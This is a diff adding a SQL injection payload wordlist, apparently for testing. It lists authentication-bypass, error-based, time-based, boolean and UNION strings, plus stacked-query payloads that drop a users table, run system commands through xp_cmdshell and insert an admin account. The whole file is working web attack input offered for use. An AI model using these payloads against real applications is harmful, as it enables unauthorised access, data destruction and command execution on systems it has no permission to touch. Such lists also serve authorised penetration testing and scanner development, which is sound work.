@@ -1,0 +1,62 @@
+# SQL Injection Payloads Database
+# Extended payloads for SQLi testing
+
+# Authentication Bypass
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'#
+' OR '1'='1'/*
+admin' OR '1'='1
+admin' OR '1'='1'--
+admin' OR '1'='1'#
+" OR "1"="1
+" OR "1"="1"--
+") OR ("1"="1
+
+# Error-based
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CAST((SELECT @@version) AS int)--
+' UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+
+# Time-based (MySQL)
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+1' AND SLEEP(5)--
+1' OR SLEEP(5)--
+' AND BENCHMARK(5000000,MD5('A'))--
+
+# Time-based (PostgreSQL)
+' AND pg_sleep(5)--
+1' AND pg_sleep(5)--
+
+# Time-based (MSSQL)
+'; WAITFOR DELAY '00:00:05'--
+1'; WAITFOR DELAY '00:00:05'--
+
+# Boolean-based
+' AND 1=1--
+' AND 1=2--
+' OR 1=1--
+' OR 1=2--
+
+# UNION-based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION SELECT table_name FROM information_schema.tables--
+
+# Stacked queries
+'; DROP TABLE users--
+'; EXEC xp_cmdshell('whoami')--
+'; INSERT INTO users VALUES ('admin','password')--
+
+# Comment variations
+'--
+'#
+'/*
+*/
+'%23
+'--%20
+'%00
